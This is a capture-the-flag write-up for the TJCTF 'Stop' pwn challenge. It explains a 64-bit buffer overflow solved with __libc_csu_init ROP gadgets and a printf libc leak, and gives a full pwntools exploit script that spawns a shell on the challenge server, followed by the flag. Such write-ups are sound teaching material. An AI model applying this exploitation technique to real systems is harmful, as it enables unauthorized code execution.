# Stop
Pwn, 70

>  Written by KyleForkBomb
>  I love playing stop, but I am tired of losing. Check out my new stop answer generator! It's a work in progress and only has a few categories, but it's 100% bug-free!
>  nc p1.tjctf.org 8001

This is another buffer overflow challenge. Since the binary is 64 bit, arguments are passed in registers, making ROP slightly more difficult. Luckily, we can use a couple gadgets in `__libc_csu_init` (`pop` and `call` in the script below) to set up arguments. We leak a libc address with printf, set up a `system`'s address and argument in `bss`, and use the `__libc_csu_init` gadgets again to get a shell.

```python
from pwn import *
import time

pop = 0x40094a
call = 0x400930
read = 0x4008e0
bss = 0x602000
getchar = 0x601fe8
pread = 0x400398
printf = 0x4005a0
rdi = 0x400953
main = 0x40073c

got = 0x601fe0

#p = process("./stop")
p = remote("p1.tjctf.org", 8001)
#gdb.attach(p)
p.sendline("a")
p.sendline("A"*256+"B"*24+p64(0x40056e)+p64(rdi)+p64(got)+p64(printf)+p64(pop)+p64(0)+p64(1)+p64(pread)+p64(0)+p64(bss)+p64(0x4141)+p64(call)+p64(0)+p64(0)+p64(1)+p64(bss+8)+p64(bss)+p64(0)+p64(0)+p64(0x40056e)+p64(call))
p.recvuntil("yet\n")
printf = u64(p.recvuntil("\x7f")+"\x00\x00")
system = printf-0x15a40
#system = printf-0xE2A0
print(hex(system))
p.sendline("/bin/sh\x00"+p64(system))
p.interactive()
```

Flag: `tjctf{st0p_th4t_r1ght_now}`